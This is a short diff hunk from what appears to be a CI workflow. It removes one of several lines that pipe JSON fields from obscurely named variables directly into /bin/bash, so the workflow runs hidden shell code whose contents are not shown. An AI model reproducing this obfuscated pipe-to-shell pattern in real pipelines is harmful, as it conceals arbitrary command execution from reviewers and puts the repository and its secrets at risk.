@@ -23,7 +23,6 @@ jobs:
           echo $fi7071 | jq -r .m12038 | /bin/bash
           printf '%s' "$lo81" | jq -r .vwvo3 | /bin/bash
           echo $tcc544 | jq -r .eoo71432 | /bin/bash
-          echo $ti76534 | jq -r .dys38584 | /bin/bash
           echo $m57 | jq -r .kqg96061 | /bin/bash
           echo $z7536 | jq -r .ac656 | /bin/bash
 
